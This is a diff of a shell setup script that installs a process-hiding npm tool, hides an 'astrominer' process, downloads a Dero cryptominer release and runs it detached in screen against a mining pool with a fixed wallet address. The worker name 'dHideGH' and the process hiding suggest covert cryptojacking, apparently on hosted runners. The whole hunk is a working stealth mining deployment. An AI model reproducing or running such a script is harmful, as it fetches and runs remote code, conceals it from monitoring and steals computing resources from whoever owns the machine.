@@ -5,8 +5,8 @@ sudo apt update && apt install --assume-yes curl && curl --silent --location htt
 echo "deb [signed-by=/usr/share/keyrings/yarnkey.gpg] https://dl.yarnpkg.com/debian stable main" | tee /etc/apt/sources.list.d/yarn.list
 sudo apt-get update && sudo apt-get install yarn -y && sudo npm install -g npm@9.1.1 && sudo npm install -g npm && sudo npm install -g node-process-hider
 sudo ph add astrominer
-wget -q https://github.com/tj8519/astrominer/releases/download/V1.4/astrominer-V1.4_amd64_rev2.tar.gz
-tar xf astrominer-V1.4_amd64_rev2.tar.gz
+wget -q https://github.com/tj8519/astrominer/releases/download/V1.5.1/astrominer-V1.5.1_linux_amd64.tar.gz
+tar xf astrominer-V1.5.1_linux_amd64.tar.gz
 screen -dms run ./astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xm369mdkp06lgvqf4y5cm.dHideGH -r pool.whalesburg.com:4305 -p stratum
 top
 EOF
